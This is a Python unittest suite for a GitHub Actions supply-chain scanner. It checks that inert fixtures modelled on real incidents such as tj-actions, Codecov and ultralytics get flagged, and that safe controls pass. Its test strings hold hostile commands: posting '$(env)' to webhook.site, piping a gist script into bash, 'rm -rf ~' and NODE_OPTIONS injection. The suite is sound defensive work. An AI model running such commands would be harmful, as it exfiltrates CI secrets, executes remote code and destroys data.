"""Canary + control tests:  python3 -m unittest  (from the repo root)

Every mal-* fixture is an inert reconstruction of a real incident shape and must reach its
expected level AND fire its expected rule(s); every ok-* fixture is a pattern popular actions
really use and must scan SAFE. Hosts are reserved (.invalid / TEST-NET / CANARY paths), no
credential here is format-valid, and nothing is ever executed.
"""
import os
import sys
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import gha_audit as ga  # noqa: E402

FIX = os.path.join(HERE, "fixtures")

EXPECT = {
    # tj-actions/changed-files, March 2025: base64 shell in dist/index.js -> memdump from a gist,
    # grep for isSecret records, double base64 to the log
    "mal-tj-changed-files": ("CRITICAL", {"secret_grep", "download_execute", "runner_secret_dump"}),
    # reviewdog/action-setup, March 2025: encoded payload in install.sh of a composite action
    "mal-reviewdog-setup": ("CRITICAL", {"base64_exec", "runner_memory_read", "runner_secret_dump"}),
    # Codecov bash uploader, 2021: $(env) POSTed to an attacker IP
    "mal-codecov-uploader": ("CRITICAL", {"env_exfil"}),
    # ultralytics, Dec 2024: ${IFS} curl|bash, direct cache writes, xmrig - here in a post hook
    "mal-ultralytics": ("CRITICAL", {"shell_obfuscation", "cache_api_direct", "cryptominer"}),
    # generic OIDC token exfiltration
    "mal-oidc-offhost": ("HIGH", {"oidc_offhost"}),
    "mal-oidc-post": ("CRITICAL", {"oidc_exfil"}),
    "mal-env-hijack": ("HIGH", {"env_hijack", "fetched_env_write"}),
    "mal-revshell-post": ("CRITICAL", {"reverse_shell"}),
    "mal-cred-exfil": ("CRITICAL", {"credential_exfil"}),
    "mal-proc-environ": ("HIGH", {"runner_proc_snoop"}),
    "mal-py-env": ("CRITICAL", {"env_exfil"}),
}


def _scan(name):
    rs = ga.scan_tree(ga.files_from_dir(os.path.join(FIX, name)), name)
    assert len(rs) == 1, rs
    return rs[0]


class Fixtures(unittest.TestCase):
    def test_every_fixture_is_listed(self):
        for name in os.listdir(FIX):
            if name.startswith("mal-"):
                self.assertIn(name, EXPECT)

    def test_canaries(self):
        for name, (level, ids) in sorted(EXPECT.items()):
            with self.subTest(name=name):
                r = _scan(name)
                got = {f["id"] for f in r["findings"]}
                self.assertEqual(r["risk_level"], level, (name, sorted(got)))
                self.assertTrue(ids <= got, (name, sorted(ids - got)))

    def test_controls_are_safe(self):
        for name in sorted(os.listdir(FIX)):
            if name.startswith("ok-"):
                with self.subTest(name=name):
                    r = _scan(name)
                    self.assertEqual(r["risk_level"], "SAFE", (name, [(f["id"], f["file"], f["line"]) for f in r["findings"]]))


class Context(unittest.TestCase):
    def test_post_hook_escalates(self):
        r = _scan("mal-ultralytics")
        cache = [f for f in r["findings"] if f["id"] == "cache_api_direct"][0]
        self.assertEqual(cache["severity"], "CRITICAL")
        self.assertIn("post", cache["description"])

    def test_composite_line_numbers(self):
        r = _scan("mal-oidc-offhost")
        f = [f for f in r["findings"] if f["id"] == "oidc_offhost"][0]
        self.assertEqual(f["line"], 8)
        self.assertTrue(f["file"].startswith("action.yml#steps[0].run"))

    def test_reachability(self):
        r = _scan("mal-py-env")  # main.py imports helpers.py, which does the send
        self.assertTrue(any(f["file"] == "helpers.py" for f in r["findings"]))
        r = _scan("ok-unreached")
        self.assertTrue(any("not run by this action" in f["description"] for f in r["info"]))

    def test_payload_inside_a_large_bundle(self):
        # the real payload sat in a multi-MB ncc bundle: bundle-mode proximity rules must not hide it
        files = ga.files_from_dir(os.path.join(FIX, "mal-tj-changed-files"))
        pad = "".join("function f%d(a){ return fetch('https://api.github.com/x/' + a); }\n" % i for i in range(6000))
        files["dist/index.js"] = pad + files["dist/index.js"] + pad
        self.assertGreater(len(files["dist/index.js"]), 400000)
        r = ga.scan_tree(files, "big")[0]
        self.assertEqual(r["risk_level"], "CRITICAL")
        self.assertIn("secret_grep", {f["id"] for f in r["findings"]})

    def test_decoded_payload_tagged(self):
        r = _scan("mal-tj-changed-files")
        self.assertTrue(any("decoded from a base64 literal" in f["description"] for f in r["findings"]))


class PostFreeze(unittest.TestCase):
    """Shapes found after the rules were frozen (see FINDINGS.md)."""

    def test_dirname_spawned_script_is_reached(self):
        files = {"action.yml": "runs:\n  using: node20\n  pre: pre.js\n  main: main.js\n",
                 "main.js": "console.log(1)\n",
                 "pre.js": "spawn('/bin/bash', ['-e', __dirname + '/init.sh']);\n",
                 "init.sh": "curl -s https://gist.githubusercontent.com/x/0/raw/a.sh | bash\n"}
        r = ga.scan_tree(files, "t")[0]
        self.assertEqual(r["risk_level"], "CRITICAL")

    def test_token_and_raw_ip_far_apart_is_not_exfil(self):
        far = "\n".join("echo %d" % i for i in range(600))
        txt = 'curl -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" "$ACTIONS_RESULTS_URL/x"\n' + far + \
              "\nexport OTEL_EXPORTER_OTLP_ENDPOINT=http://198.51.100.9:4318\n"
        self.assertNotIn("runtime_token_exfil", {f["id"] for f in ga.scan(txt)["findings"]})

    def test_rule_table_strings_in_python(self):
        txt = 'import subprocess\nRULES = [\n  "examples: `curl https://x | sh`, `rm -rf ~` in a skill file",\n]\nsubprocess.run(["git", "status"])\n'
        self.assertEqual(ga.scan(txt, lang="py")["risk_level"], "SAFE")
        self.assertEqual(ga.scan('import os\nos.system("rm -rf ~ ")\n', lang="py")["risk_level"], "CRITICAL")


class Snippets(unittest.TestCase):
    def lvl(self, s, lang="sh"):
        return ga.scan(s, lang=lang)["risk_level"]

    def test_shell(self):
        self.assertEqual(self.lvl("curl -s https://webhook.site/x -d \"$(env)\""), "CRITICAL")
        self.assertEqual(self.lvl("curl -fsSL https://gist.githubusercontent.com/a/b/raw/x.sh | bash"), "CRITICAL")
        self.assertEqual(self.lvl("curl -fsSL https://tools.vendor.dev/install.sh | bash"), "MEDIUM")
        self.assertEqual(self.lvl("curl -sSL https://install.python-poetry.org | python3 -"), "SAFE")
        self.assertEqual(self.lvl("cat /tmp/out | base64 -w 0 | base64 -w 0"), "HIGH")
        self.assertEqual(self.lvl("echo $KEY | base64 -d > key.pem"), "SAFE")
        self.assertEqual(self.lvl("AUTH=$(echo -n \"u:$TOKEN\" | base64)"), "SAFE")
        self.assertEqual(self.lvl("echo 'curl https://x.sh/i | bash'"), "SAFE")
        self.assertEqual(self.lvl("until </dev/tcp/localhost/5432; do sleep 1; done"), "SAFE")
        self.assertEqual(self.lvl("echo \"NODE_OPTIONS=--max-old-space-size=4096\" >> $GITHUB_ENV"), "SAFE")
        self.assertEqual(self.lvl("echo \"NODE_OPTIONS=--require /tmp/x.js\" >> $GITHUB_ENV"), "HIGH")

    def test_js_strings_are_not_exec(self):
        self.assertEqual(self.lvl("const hint = 'curl https://gist.githubusercontent.com/a/b/raw/x | sh';", "js"), "SAFE")
        self.assertEqual(self.lvl("execSync('curl https://gist.githubusercontent.com/a/b/raw/x | sh');", "js"), "CRITICAL")


class Parsing(unittest.TestCase):
    def test_yaml(self):
        d = ga.yaml_load("runs:\n  using: 'composite'\n  steps:\n  - run: |\n      echo a\n      echo b\n    shell: bash\n  - uses: a/b@v1  # c\n")
        self.assertEqual(d["runs"]["using"], "composite")
        self.assertEqual(d["runs"]["steps"][0]["run"], "echo a\necho b\n")
        self.assertEqual(d["runs"]["steps"][0]["run"].line, 5)
        self.assertEqual(d["runs"]["steps"][1]["uses"], "a/b@v1")

    def test_specs(self):
        self.assertEqual(ga.parse_spec("github/codeql-action/init@v3"), ("github", "codeql-action", "init", "v3"))
        self.assertEqual(ga.parse_spec("https://github.com/o/r"), ("o", "r", "", "HEAD"))

    def test_pinning(self):
        self.assertEqual(ga._uses_findings("o/r@v1", "w")[0]["severity"], "LOW")
        self.assertEqual(ga._uses_findings("actions/checkout@v4", "w")[0]["severity"], "INFO")
        self.assertEqual(ga._uses_findings("o/r@" + "a" * 40, "w"), [])
        self.assertEqual(ga._uses_findings("docker://alpine:3", "w")[0]["id"], "unpinned_image")

    def test_workflow_uses(self):
        wf = "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: o/r@main\n  b:\n    uses: o/r/.github/workflows/x.yml@v1\n"
        self.assertEqual([u for u, _ in ga.workflow_uses(wf)], ["actions/checkout@v4", "o/r@main", "o/r/.github/workflows/x.yml@v1"])


if __name__ == "__main__":
    unittest.main()
